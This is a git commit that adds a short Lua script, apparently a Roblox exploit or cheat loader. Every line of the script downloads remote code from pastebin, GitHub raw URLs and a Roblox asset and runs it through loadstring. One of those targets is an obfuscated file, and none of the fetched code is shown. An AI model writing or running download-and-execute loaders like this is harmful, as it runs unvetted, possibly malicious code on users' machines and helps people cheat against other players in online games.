45a112907085f538c37c607cdaf7cbbcbabd78d8
skibidimattgig <zedroxtt@gmail.com>
2025-06-10 21:40:01 +0300

    Create dlyauzkih.lua

---
+++ dlyauzkih.lua
@@ -0,0 +1,10 @@
+local function load(str)
+  coroutine.wrap(function()
+    loadstring(game:HttpGet((str),true))()
+  end)()
+end
+
+load("https://pastebin.com/raw/n88ttmFh")
+loadstring(game:GetObjects(rbxassetid://4001118261)[1].Source)()
+load("https://raw.githubusercontent.com/skibidimattgig/bottlecap/refs/heads/main/flymatron%203000")
+load("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt")
